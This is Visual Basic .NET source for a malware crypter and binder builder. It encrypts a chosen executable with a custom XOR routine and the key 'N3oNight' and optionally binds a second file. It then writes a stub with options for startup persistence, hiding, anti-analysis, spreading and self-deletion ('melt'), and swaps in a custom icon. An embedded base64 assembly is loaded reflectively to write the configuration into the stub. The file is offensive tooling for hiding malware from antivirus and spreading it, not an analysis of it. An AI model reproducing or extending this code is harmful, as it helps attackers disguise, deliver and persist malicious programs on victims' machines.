Imports System.Text
Imports System.Runtime.InteropServices

Public Class Form1
    Private draggable As Boolean
    Private mouseY As Integer
    Private mouseX As Integer
    Dim bind As String
    Dim start, bind_chk, hid, antis, spread, melt As Boolean
    Dim bind_nam As String = Nothing
    Dim persistense, Rar As Boolean
    Private Sub Closebtn_Click(sender As Object, e As EventArgs) Handles Closebtn.Click
        Close()
    End Sub
    Private Sub Panel1_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel1.MouseDown
        draggable = True
        mouseX = Cursor.Position.X - Me.Left
        mouseY = Cursor.Position.Y - Me.Top
    End Sub
    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove
        If draggable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub
    Private Sub Panel1_MouseUp(sender As Object, e As MouseEventArgs) Handles Panel1.MouseUp
        draggable = False
    End Sub
    Private Sub RoastingLabel_MouseDown(sender As Object, e As MouseEventArgs) Handles RoastingLabel.MouseDown
        draggable = True
        mouseX = Cursor.Position.X - Me.Left
        mouseY = Cursor.Position.Y - Me.Top
    End Sub
    Private Sub RoastingLabel_MouseMove(sender As Object, e As MouseEventArgs) Handles RoastingLabel.MouseMove
        If draggable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub
    Private Sub RoastingLabel_MouseUp(sender As Object, e As MouseEventArgs) Handles RoastingLabel.MouseUp
        draggable = False
    End Sub
    Private Sub RoastingPic_MouseDown(sender As Object, e As MouseEventArgs) Handles RoastingPic.MouseDown
        draggable = True
        mouseX = Cursor.Position.X - Me.Left
        mouseY = Cursor.Position.Y - Me.Top
    End Sub
    Private Sub RoastingPic_MouseMove(sender As Object, e As MouseEventArgs) Handles RoastingPic.MouseMove
        If draggable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub
    Private Sub RoastingPic_MouseUp(sender As Object, e As MouseEventArgs) Handles RoastingPic.MouseUp
        draggable = False
    End Sub

    Private Sub KryptonButton1_Click(sender As Object, e As EventArgs) Handles KryptonButton1.Click
        Dim ofd As New OpenFileDialog : ofd.Filter = "Executables *.exe|*.exe" : If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then TextBox1.Text = ofd.FileName Else TextBox1.Text = ""
    End Sub

    Public Shared Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Public Class StairsEncryption
        Public Shared Function Crypt(ByVal Data As String, ByVal key As String) As String
            Return Encoding.Default.GetString(Crypt1(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)))
        End Function
        Public Shared Function Crypt1(ByVal Data() As Byte, ByVal key() As Byte) As Byte()
            For i = 0 To (Data.Length * 2) + key.Length
                Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor key(i Mod key.Length)
            Next
            Return Data
        End Function
    End Class

    Private Sub KryptonButton6_Click(sender As Object, e As EventArgs) Handles KryptonButton6.Click
        Dim sfd As New SaveFileDialog
        sfd.Filter = "Executable Files (*.exe)|*.exe|Com Files (*.com)|*.com|Batch Files (*.bat)|*.bat|Program Information File (*.pif)|*.pif"
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
        End If

        Dim input As String = Convert.ToBase64String(Encoding.Default.GetBytes(StairsEncryption.Crypt(Encoding.Default.GetString(IO.File.ReadAllBytes(TextBox1.Text)), "N3oNight")))

        If TextBox2.Text = "(Optional) Bind File" Then

        Else
            bind_chk = True
            bind = Convert.ToBase64String(Encoding.Default.GetBytes(StairsEncryption.Crypt(Encoding.Default.GetString(IO.File.ReadAllBytes(TextBox2.Text)), "N3oNight")))
            bind_nam = IO.Path.GetFileName(TextBox2.Text)
        End If

        Dim process As String = TextBox11.Text

        If CheckBox3.Checked = True Then
            start = True
        End If


        If CheckBox1.Checked = True Then
            start = True
        End If

        If CheckBox5.Checked = True Then
            persistense = True
        End If

        Dim start_name As String = Textbox11.Text

        If CheckBox12.Checked = True Then
            hid = True
        End If

        If CheckBox13.Checked = True Then
            antis = True
        End If

        If CheckBox15.Checked = True Then
            spread = True
        End If

        If CheckBox14.Checked = True Then
            melt = True
        End If

        If CheckBox4.Checked = True Then
            Rar = True
        End If

        My.Computer.FileSystem.WriteAllBytes(sfd.FileName, My.Resources.Stub, False)



        If TextBox4.Text = "Add Icon" Then
        Else
            IconChanger.InjectIcon(sfd.FileName, TextBox4.Text)
        End If

        Dim Data As String = "XPfW2DM9UMKdB2ZJDJtX" & input & "XPfW2DM9UMKdB2ZJDJtX" & bind_chk & "XPfW2DM9UMKdB2ZJDJtX" & bind & "XPfW2DM9UMKdB2ZJDJtX" & bind_nam & "XPfW2DM9UMKdB2ZJDJtX" & process & "XPfW2DM9UMKdB2ZJDJtX" & start & "XPfW2DM9UMKdB2ZJDJtX" & start_name & "XPfW2DM9UMKdB2ZJDJtX" & hid & "XPfW2DM9UMKdB2ZJDJtX" & antis & "XPfW2DM9UMKdB2ZJDJtX" & spread & "XPfW2DM9UMKdB2ZJDJtX" & melt & "XPfW2DM9UMKdB2ZJDJtX" & persistense & "XPfW2DM9UMKdB2ZJDJtX" & Rar
        Dim Byteofdata As Byte() = Encoding.Default.GetBytes(Data)
        System.Reflection.Assembly.Load(Convert.FromBase64String("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wwABAEABCQDjAAEAQAELAPcAAQAAAAAAAQAAAAAAAAAAAAAAAAAPAAAAAgAAAAAAAAAAAAAAAQAtAAAAAAACAAAAAAAAAAAAAAABAD0AAAAAAAgAAAAAAAAAAAAAAJcBpwMAAAAAAAAAAAEAAAAqAwAAAAAAV3JpdGVEYXRhLmRsbABXcml0ZURhdGEAPE1vZHVsZT4ARGF0YQBXcml0ZQBtc2NvcmxpYgBPYmplY3QAU3lzdGVtAE15U2V0dGluZ3MAV3JpdGUuTXkAQXBwbGljYXRpb25TZXR0aW5nc0Jhc2UAU3lzdGVtLkNvbmZpZ3VyYXRpb24AUG93ZXJlZEJ5QXR0cmlidXRlAFNtYXJ0QXNzZW1ibHkuQXR0cmlidXRlcwBBdHRyaWJ1dGUAAQAuY3RvcgBVcGRhdGVSZXNvdXJjZQBrZXJuZWwzMi5kbGwAAgADAEJlZ2luVXBkYXRlUmVzb3VyY2UARW5kVXBkYXRlUmVzb3VyY2UATjNvTmlnaHQAZmlsZW5hbWUAYnl0ZXMALmNjdG9yAHMARGVmYXVsdABBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAFN5c3RlbS5SZWZsZWN0aW9uAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEdlbmVyYXRlZENvZGVBdHRyaWJ1dGUAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIARWRpdG9yQnJvd3NhYmxlQXR0cmlidXRlAFN5c3RlbS5Db21wb25lbnRNb2RlbABFZGl0b3JCcm93c2FibGVTdGF0ZQBXcml0ZS5SZXNvdXJjZXMucmVzb3VyY2VzAEdDSGFuZGxlAEFkZHJPZlBpbm5lZE9iamVjdABGcmVlAFJ1bnRpbWVIZWxwZXJzAEdldE9iamVjdFZhbHVlAEFsbG9jAEdDSGFuZGxlVHlwZQBDb252ZXJ0AFRvVUludDMyAE1pY3Jvc29mdC5WaXN1YWxCYXNpYwBQcm9qZWN0RGF0YQBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuQ29tcGlsZXJTZXJ2aWNlcwBTZXRQcm9qZWN0RXJyb3IARXhjZXB0aW9uAENsZWFyUHJvamVjdEVycm9yAFNldHRpbmdzQmFzZQBTeW5jaHJvbml6ZWQAAAAAE04AMwBPAF8ATgBJAEcASABUAAAHOQAxADEAAAAAAJ26ISDZbk5BlMcZ5CjcBgwACLd6XFYZNOCJAwYSDAMgAAEEAAEYHAkABgIYDg4HGAkFAAIYDgIBAgUAAgIYAgYAAgIOHQUDAAABBAAAEgwEIAEBDgQIABIMJgEAIVBvd2VyZWQgYnkgU21hcnRBc3NlbWJseSA2LjYuMy40MQAABQEAAAAADAEABzEuMC4wLjAAAA4BAAlXcml0ZURhdGEAAAQgAQEICAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzASkBACRmNzcxYjQ4OC1iZGVkLTRjN2UtYjVjOS03OThjYmFmYzdlMDMAAAQgAQECFwEAEkNvcHlyaWdodCDCqSAgMjAxMgAABAEAAAAFIAIBDg5ZAQBLTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5FZGl0b3JzLlNldHRpbmdzRGVzaWduZXIuU2V0dGluZ3NTaW5nbGVGaWxlR2VuZXJhdG9yCDEwLjAuMC4wAAAFIAEBEUkIAQACAAAAAAADIAAYBAABHBwHAAIRTRwRVQYHAxFNGBgEAAEJCAiwP19/EdUKOgUAAQESYQoHBgIdBRgYAhJhBgABEmUSZQQHARIMAAAAtAAAAM7K774BAAAAkQAAAGxTeXN0ZW0uUmVzb3VyY2VzLlJlc291cmNlUmVhZGVyLCBtc2NvcmxpYiwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkjU3lzdGVtLlJlc291cmNlcy5SdW50aW1lUmVzb3VyY2VTZXQCAAAAAAAAAAAAAABQQURQQURQtAAAAIQsAAAAAAAAAAAAAJosAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAACMLAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAACoPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")).GetType("Write.Data").GetMethod("N3oNight").Invoke(Nothing, New Object() {sfd.FileName, Byteofdata})
    End Sub

    Public Shared Function C(ByVal byt As String, Optional ByVal p As String = Nothing) As Byte()
        Dim bytes() As Byte = System.Text.Encoding.Default.GetBytes(byt)
        Dim key() As Byte
        If p = Nothing Then
            key = New Byte() {99}
        Else
            key = System.Text.Encoding.Default.GetBytes(p)
        End If
        Dim s(255) As Byte
        Dim i As Integer
        For i = 0 To s.Length - 1
            s(i) = CByte(i)
        Next
        Dim j As Integer
        For i = 0 To s.Length - 1
            j = (j + key(i Mod key.Length) + s(i)) And 255
            Dim temp As Byte = s(i)
            s(i) = s(j)
            s(j) = temp
        Next
        i = 0 : j = 0
        Dim output(bytes.Length - 1) As Byte
        Dim k As Integer
        For k = 0 To bytes.Length - 1
            i = (i + 1) And 255
            j = (j + s(i)) And 255
            Dim temp As Byte = s(i)
            s(i) = s(j)
            s(j) = temp
            output(k) = s((CType(s(i), Integer) + s(j)) And 255) Xor bytes(k)
        Next
        Return output
    End Function

    Public Shared Function C2(ByVal B As String, ByVal D As String) As Byte()
        Dim H = New System.Security.Cryptography.MD5CryptoServiceProvider()
        Dim T = New System.Security.Cryptography.TripleDESCryptoServiceProvider()
        T.Key = H.ComputeHash(System.Text.Encoding.Default.GetBytes("%GUID%"))
        T.Mode = System.Security.Cryptography.CipherMode.ECB
        T.Padding = System.Security.Cryptography.PaddingMode.PKCS7
        Dim CT As System.Security.Cryptography.ICryptoTransform = T.CreateDecryptor()
        Return CT.TransformFinalBlock(Convert.FromBase64String(B), 0, Convert.FromBase64String(B).Length)
    End Function

    Private Sub KryptonButton2_Click(sender As Object, e As EventArgs) Handles KryptonButton2.Click
        TextBox3.Text = random_key(22)
    End Sub

    Private Sub KryptonButton3_Click(sender As Object, e As EventArgs) Handles KryptonButton3.Click
        Dim ofd As New OpenFileDialog : If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then TextBox2.Text = ofd.FileName Else TextBox2.Text = ""
    End Sub

    Private Sub KryptonButton4_Click(sender As Object, e As EventArgs) Handles KryptonButton4.Click
        Dim openIcon As New OpenFileDialog With {.DefaultExt = "ico", .Filter = "Icons|*.ico", .Title = "Open icon"}
        If openIcon.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBox4.Text = openIcon.FileName
            Dim cusIcon As New Icon(openIcon.FileName)
            PictureBox1.Image = cusIcon.ToBitmap
        End If
    End Sub

    Private Sub KryptonButton5_Click(sender As Object, e As EventArgs) Handles KryptonButton5.Click
        TextBox7.Text = random_key(20)
        TextBox8.Text = random_key(22)
        TextBox9.Text = random_key(19)
        TextBox10.Text = random_key(21)
    End Sub
End Class